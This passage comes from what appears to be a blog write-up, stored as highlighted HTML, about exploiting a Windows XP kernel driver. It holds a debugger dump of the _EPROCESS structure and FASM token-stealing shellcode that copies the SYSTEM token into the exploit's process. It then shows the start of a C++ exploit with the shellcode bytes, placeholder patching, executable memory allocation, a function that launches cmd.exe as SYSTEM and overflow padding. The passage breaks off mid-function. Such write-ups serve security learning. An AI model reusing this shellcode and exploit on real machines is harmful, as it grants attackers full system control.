+<span class="n">kd</span><span class="o">&gt;</span> <span class="kt">dt</span> <span class="n">_EPROCESS</span> <span class="n">poi</span><span class="p">(</span><span class="n">ffdff000</span><span class="o">+</span><span class="mh">0x120</span><span class="o">+</span><span class="mh">0x004</span><span class="p">)</span><span class="o">+</span><span class="mh">0x034</span><span class="o">+</span><span class="mh">0x10</span> 
+<span class="n">nt</span><span class="err">!</span><span class="n">_EPROCESS</span>
+   <span class="o">+</span><span class="mh">0x000</span> <span class="n">Pcb</span>              <span class="o">:</span> <span class="n">_KPROCESS</span>
+   <span class="o">+</span><span class="mh">0x06c</span> <span class="n">ProcessLock</span>      <span class="o">:</span> <span class="n">_EX_PUSH_LOCK</span>
+   <span class="o">+</span><span class="mh">0x070</span> <span class="n">CreateTime</span>       <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x80552838</span><span class="err">`</span><span class="mi">00000000</span>
+   <span class="o">+</span><span class="mh">0x078</span> <span class="n">ExitTime</span>         <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x80552740</span><span class="err">`</span><span class="mi">80552838</span>
+   <span class="o">+</span><span class="mh">0x080</span> <span class="n">RundownProtect</span>   <span class="o">:</span> <span class="n">_EX_RUNDOWN_REF</span>
+   <span class="o">+</span><span class="mh">0x084</span> <span class="n">UniqueProcessId</span>  <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x088</span> <span class="n">ActiveProcessLinks</span> <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x10102</span> <span class="o">-</span> <span class="mh">0x0</span> <span class="err">]</span>
+   <span class="o">+</span><span class="mh">0x090</span> <span class="n">QuotaUsage</span>       <span class="o">:</span> <span class="p">[3]</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x09c</span> <span class="n">QuotaPeak</span>        <span class="o">:</span> <span class="p">[3]</span> <span class="mh">0x80552fa0</span>
+   <span class="o">+</span><span class="mh">0x0a8</span> <span class="n">CommitCharge</span>     <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x0ac</span> <span class="n">PeakVirtualSize</span>  <span class="o">:</span> <span class="mh">0xa0008</span>
+   <span class="o">+</span><span class="mh">0x0b0</span> <span class="n">VirtualSize</span>      <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x0b4</span> <span class="n">SessionProcessLinks</span> <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x80552838</span> <span class="o">-</span> <span class="mh">0x80552838</span> <span class="err">]</span>
+   <span class="o">+</span><span class="mh">0x0bc</span> <span class="n">DebugPort</span>        <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x0c0</span> <span class="n">ExceptionPort</span>    <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x0c4</span> <span class="n">ObjectTable</span>      <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x0c8</span> <span class="n">Token</span>            <span class="o">:</span> <span class="n">_EX_FAST_REF</span>
+   <span class="o">+</span><span class="mh">0x0cc</span> <span class="n">WorkingSetLock</span>   <span class="o">:</span> <span class="n">_FAST_MUTEX</span>
+   <span class="o">+</span><span class="mh">0x0ec</span> <span class="n">WorkingSetPage</span>   <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x0f0</span> <span class="n">AddressCreationLock</span> <span class="o">:</span> <span class="n">_FAST_MUTEX</span>
+   <span class="o">+</span><span class="mh">0x110</span> <span class="n">HyperSpaceLock</span>   <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x114</span> <span class="n">ForkInProgress</span>   <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x118</span> <span class="n">HardwareTrigger</span>  <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x11c</span> <span class="n">VadRoot</span>          <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x120</span> <span class="n">VadHint</span>          <span class="o">:</span> <span class="mh">0x00010000</span> <span class="n">Void</span>
+   <span class="o">+</span><span class="mh">0x124</span> <span class="n">CloneRoot</span>        <span class="o">:</span> <span class="mh">0x80549f00</span> <span class="n">Void</span>
+   <span class="o">+</span><span class="mh">0x128</span> <span class="n">NumberOfPrivatePages</span> <span class="o">:</span> <span class="mh">0x300012</span>
+   <span class="o">+</span><span class="mh">0x12c</span> <span class="n">NumberOfLockedPages</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x130</span> <span class="n">Win32Process</span>     <span class="o">:</span> <span class="mh">0x80552740</span> <span class="n">Void</span>
+   <span class="o">+</span><span class="mh">0x134</span> <span class="n">Job</span>              <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x138</span> <span class="n">SectionObject</span>    <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x13c</span> <span class="n">SectionBaseAddress</span> <span class="o">:</span> <span class="mh">0x80500832</span> <span class="n">Void</span>
+   <span class="o">+</span><span class="mh">0x140</span> <span class="n">QuotaBlock</span>       <span class="o">:</span> <span class="mh">0x8050083a</span> <span class="n">_EPROCESS_QUOTA_BLOCK</span>
+   <span class="o">+</span><span class="mh">0x144</span> <span class="n">WorkingSetWatch</span>  <span class="o">:</span> <span class="mh">0x80500c70</span> <span class="n">_PAGEFAULT_HISTORY</span>
+   <span class="o">+</span><span class="mh">0x148</span> <span class="n">Win32WindowStation</span> <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x14c</span> <span class="n">InheritedFromUniqueProcessId</span> <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x150</span> <span class="n">LdtInformation</span>   <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x154</span> <span class="n">VadFreeHint</span>      <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x158</span> <span class="n">VdmObjects</span>       <span class="o">:</span> <span class="mh">0x00050005</span> <span class="n">Void</span>
+   <span class="o">+</span><span class="mh">0x15c</span> <span class="n">DeviceMap</span>        <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x160</span> <span class="n">PhysicalVadList</span>  <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x805528e4</span> <span class="o">-</span> <span class="mh">0x805528e4</span> <span class="err">]</span>
+   <span class="o">+</span><span class="mh">0x168</span> <span class="n">PageDirectoryPte</span> <span class="o">:</span> <span class="n">_HARDWARE_PTE</span>
+   <span class="o">+</span><span class="mh">0x168</span> <span class="n">Filler</span>           <span class="o">:</span> <span class="mh">0x805529f0</span><span class="err">`</span><span class="mi">00000002</span>
+   <span class="o">+</span><span class="mh">0x170</span> <span class="n">Session</span>          <span class="o">:</span> <span class="mh">0x805529f0</span> <span class="n">Void</span>
+   <span class="o">+</span><span class="mh">0x174</span> <span class="n">ImageFileName</span>    <span class="o">:</span> <span class="p">[16]</span>  <span class="s">""</span>
+   <span class="o">+</span><span class="mh">0x184</span> <span class="n">JobLinks</span>         <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x0</span> <span class="o">-</span> <span class="mh">0x0</span> <span class="err">]</span>
+   <span class="o">+</span><span class="mh">0x18c</span> <span class="n">LockedPagesList</span>  <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x190</span> <span class="n">ThreadListHead</span>   <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x0</span> <span class="o">-</span> <span class="mh">0x0</span> <span class="err">]</span>
+   <span class="o">+</span><span class="mh">0x198</span> <span class="n">SecurityPort</span>     <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x19c</span> <span class="n">PaeTop</span>           <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x1a0</span> <span class="n">ActiveThreads</span>    <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x1a4</span> <span class="n">GrantedAccess</span>    <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x1a8</span> <span class="n">DefaultHardErrorProcessing</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x1ac</span> <span class="n">LastThreadExitStatus</span> <span class="o">:</span> <span class="mi">0</span><span class="n">n0</span>
+   <span class="o">+</span><span class="mh">0x1b0</span> <span class="n">Peb</span>              <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x1b4</span> <span class="n">PrefetchTrace</span>    <span class="o">:</span> <span class="n">_EX_FAST_REF</span>
+   <span class="o">+</span><span class="mh">0x1b8</span> <span class="n">ReadOperationCount</span> <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
+   <span class="o">+</span><span class="mh">0x1c0</span> <span class="n">WriteOperationCount</span> <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
+   <span class="o">+</span><span class="mh">0x1c8</span> <span class="n">OtherOperationCount</span> <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
+   <span class="o">+</span><span class="mh">0x1d0</span> <span class="n">ReadTransferCount</span> <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
+   <span class="o">+</span><span class="mh">0x1d8</span> <span class="n">WriteTransferCount</span> <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
+   <span class="o">+</span><span class="mh">0x1e0</span> <span class="n">OtherTransferCount</span> <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
+   <span class="o">+</span><span class="mh">0x1e8</span> <span class="n">CommitChargeLimit</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x1ec</span> <span class="n">CommitChargePeak</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x1f0</span> <span class="n">AweInfo</span>          <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x1f4</span> <span class="n">SeAuditProcessCreationInfo</span> <span class="o">:</span> <span class="n">_SE_AUDIT_PROCESS_CREATION_INFO</span>
+   <span class="o">+</span><span class="mh">0x1f8</span> <span class="n">Vm</span>               <span class="o">:</span> <span class="n">_MMSUPPORT</span>
+   <span class="o">+</span><span class="mh">0x238</span> <span class="n">LastFaultCount</span>   <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x23c</span> <span class="n">ModifiedPageCount</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x240</span> <span class="n">NumberOfVads</span>     <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x244</span> <span class="n">JobStatus</span>        <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Flags</span>            <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">CreateReported</span>   <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">NoDebugInherit</span>   <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">ProcessExiting</span>   <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">ProcessDelete</span>    <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Wow64SplitPages</span>  <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">VmDeleted</span>        <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">OutswapEnabled</span>   <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Outswapped</span>       <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">ForkFailed</span>       <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">HasPhysicalVad</span>   <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">AddressSpaceInitialized</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y00</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">SetTimerResolution</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">BreakOnTermination</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">SessionCreationUnderway</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">WriteWatch</span>       <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">ProcessInSession</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">OverrideAddressSpace</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">HasAddressSpace</span>  <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">LaunchPrefetched</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">InjectInpageErrors</span> <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">VmTopDown</span>        <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Unused3</span>          <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Unused4</span>          <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">VdmAllowed</span>       <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Unused</span>           <span class="o">:</span> <span class="mi">0</span><span class="n">y00000</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Unused1</span>          <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x248</span> <span class="n">Unused2</span>          <span class="o">:</span> <span class="mi">0</span><span class="n">y0</span>
+   <span class="o">+</span><span class="mh">0x24c</span> <span class="n">ExitStatus</span>       <span class="o">:</span> <span class="mi">0</span><span class="n">n8364</span>
+   <span class="o">+</span><span class="mh">0x250</span> <span class="n">NextPageColor</span>    <span class="o">:</span> <span class="mi">1</span>
+   <span class="o">+</span><span class="mh">0x252</span> <span class="n">SubSystemMinorVersion</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x253</span> <span class="n">SubSystemMajorVersion</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x252</span> <span class="n">SubSystemVersion</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x254</span> <span class="n">PriorityClass</span>    <span class="o">:</span> <span class="mh">0x58</span> <span class="sc">'X'</span>
+   <span class="o">+</span><span class="mh">0x255</span> <span class="n">WorkingSetAcquiredUnsafe</span> <span class="o">:</span> <span class="mh">0x18</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x258</span> <span class="n">Cookie</span>           <span class="o">:</span> <span class="mi">0</span></code></pre></figure>
+
+<p>We could get <code>UniqueProcessId (+0x084)</code>, our <code>Token (+0x0c8)</code> and also the linked list <code>ActiveProcessLinks (+0x088)</code> to get the list of all process.<br />
+In XP, the identifier of SYSTEM process is <strong>4</strong> and we can get our PID with <code>GetCurrentProcessId()</code>.<br />
+With these information, we can code our shellcode. I have coded mine with the FASM syntax:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">format</span> <span class="n">PE</span> <span class="n">GUI</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span>
+
+<span class="n">start</span><span class="o">:</span>
+
+<span class="c">;--------------------------------</span>
+<span class="c">; 			Stack</span>
+<span class="c">;--------------------------------</span>
+<span class="c">; ESP-8: EPROCESS+0x088 system</span>
+<span class="c">;--------------------------------</span>
+<span class="c">; ESP-4: EPROCESS+0x088 exploit</span>
+<span class="c">;--------------------------------</span>
+<span class="k">push</span> <span class="mh">0xFFFFFFFF</span>
+<span class="k">push</span> <span class="mh">0xFFFFFFFF</span>
+
+<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">fs</span><span class="o">:</span><span class="mh">0x124</span><span class="err">]</span>		<span class="c">; +0x120 PrcbData : _KPRCB | +0x004 CurrentThread : _KTHREAD			</span>
+<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">+</span> <span class="mh">0x44</span><span class="err">]</span>	<span class="c">; +0x034 ApcState : _KAPC_STATE | +0x010 Process : _KPROCESS</span>
+<span class="k">add</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x88</span> 			<span class="c">; +0x088 ActiveProcessLinks : _LIST_ENTRY</span>
+<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">edx</span> 			<span class="c">; Our linked list \o/ We save the first structure</span>
+
+<span class="n">searchProcess</span><span class="o">:</span>
+<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">-</span> <span class="mh">0x4</span><span class="err">]</span>	<span class="c">; +0x084 UniqueProcessId</span>
+<span class="k">cmp</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x4</span> 			<span class="c">; SYSTEM PID</span>
+<span class="k">je</span> <span class="n">sysProcFound</span>
+<span class="k">cmp</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x41414141</span>		<span class="c">; Our exploit PID</span>
+<span class="k">je</span> <span class="n">exploitProcFound</span>
+
+<span class="n">nextProcess</span><span class="o">:</span>
+<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[edx]</span>			<span class="c">; Next process (Flink)</span>
+<span class="k">cmp</span> <span class="n">edx</span><span class="p">,</span> <span class="n">ebx</span>			<span class="c">; We are back at the starting point</span>
+<span class="k">je</span> <span class="n">retApp</span>				
+<span class="k">jmp</span> <span class="n">searchProcess</span>		<span class="c">; We loop !</span>
+
+<span class="n">sysProcFound</span><span class="o">:</span>
+<span class="k">mov</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">edx</span>
+<span class="k">jmp</span> <span class="n">allPIDFound</span>
+
+<span class="n">exploitProcFound</span><span class="o">:</span>
+<span class="k">mov</span> <span class="p">[esp],</span> <span class="n">edx</span>
+
+<span class="n">allPIDFound</span><span class="o">:</span>
+<span class="k">cmp</span> <span class="p">[esp],</span> <span class="n">dword</span> <span class="mh">0xFFFFFFFF</span>
+<span class="k">je</span> <span class="n">nextProcess</span>
+<span class="k">cmp</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">dword</span> <span class="mh">0xFFFFFFFF</span>
+<span class="k">je</span> <span class="n">nextProcess</span>
+<span class="c">; On copie le token SYSTEM</span>
+<span class="k">pop</span> <span class="n">edi</span>					<span class="c">; Exploit</span>
+<span class="k">pop</span> <span class="n">esi</span>					<span class="c">; System</span>
+<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span> <span class="mh">0x40</span><span class="err">]</span>	<span class="c">; 0xC8 - 0x88 = 0x40 | +0x0c8 Token : _EX_FAST_REF</span>
+<span class="k">mov</span> <span class="err">[</span><span class="n">edi</span> <span class="o">+</span> <span class="mh">0x40</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
+
+<span class="n">retApp</span><span class="o">:</span>
+<span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+<span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3B</span>			<span class="c">; FS address in userland</span>
+<span class="k">mov</span> <span class="n">fs</span><span class="p">,</span> <span class="n">ax</span>
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="mh">0x42424242</span>		<span class="c">; Stack address</span>
+<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x43434343</span>		<span class="c">; Address of our function in our process</span>
+<span class="k">sysexit</span></code></pre></figure>
+
+<h2 id="final-exploit">Final exploit</h2>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;windows.h&gt;
+#include &lt;winioctl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="cp">#define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define DEVICE_NAME "\\\\.\\1"
+</span>
+<span class="n">BYTE</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>  <span class="s">"</span><span class="se">\x6A\xFF\x6A\xFF\x64\x8B\x15\x24\x01\x00\x00\x8B\x52\x44\x81\xC2\x88\x00\x00\x00\x89\xD3\x8B</span><span class="s">"</span>
+                    <span class="s">"</span><span class="se">\x42\xFC\x83\xF8\x04\x74\x0F\x3D\x41\x41\x41\x41\x74\x0E\x8B\x12\x39\xDA\x74\x26\xEB\xE9\x89</span><span class="s">"</span>
+                    <span class="s">"</span><span class="se">\x54\x24\x04\xEB\x03\x89\x14\x24\x81\x3C\x24\xFF\xFF\xFF\xFF\x74\xE6\x81\x7C\x24\x04\xFF\xFF</span><span class="s">"</span>
+                    <span class="s">"</span><span class="se">\xFF\xFF\x74\xDC\x5F\x5E\x8B\x46\x40\x89\x47\x40\x31\xC0\xB0\x3B\x8E\xE0\xB9\x42\x42\x42\x42</span><span class="s">"</span>
+                    <span class="s">"</span><span class="se">\xBA\x43\x43\x43\x43\x0F\x35</span><span class="s">"</span><span class="p">;</span>
+<span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>  
+
+
+<span class="kt">void</span> <span class="nf">replacePattern</span><span class="p">(</span><span class="kt">char</span> <span class="n">buffer</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">bufferSize</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">BOOL</span> <span class="n">found</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">bufferSize</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="n">pattern</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">found</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+            <span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">found</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Code to execute with SYSTEM's right
+//
+</span><span class="kt">void</span> <span class="nf">sysCode</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
+
+    <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"cmd.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="n">findStack</span><span class="p">(){</span>
+    <span class="n">DWORD</span> <span class="n">stack</span><span class="p">;</span>
+
+    <span class="kr">__asm</span> <span class="n">mov</span> <span class="n">stack</span><span class="p">,</span> <span class="n">esp</span>
+
+    <span class="k">return</span> <span class="n">stack</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lenMagik</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">UCHAR</span> <span class="n">magik</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+    <span class="n">addr</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mh">0x01010101</span><span class="p">,</span> <span class="mh">0x10000</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Error with VirtualProtect : %.8x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="n">GetCurrentProcessId</span><span class="p">());</span>    <span class="c1">// Process PID
+</span>    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x42424242</span><span class="p">,</span> <span class="n">findStack</span><span class="p">());</span>              <span class="c1">// Stack address
+</span>    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x43434343</span><span class="p">,</span> <span class="n">sysCode</span><span class="p">);</span>                  <span class="c1">// Code to execute with SYSTEM's right
+</span>    <span class="n">memcpy</span><span class="p">(</span><span class="mh">0x01010101</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+
+    <span class="n">memset</span><span class="p">(</span><span class="n">magik</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mi">276</span><span class="p">);</span> <span class="c1">// Padding
+</span>    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">276</span><span class="p">;</span>
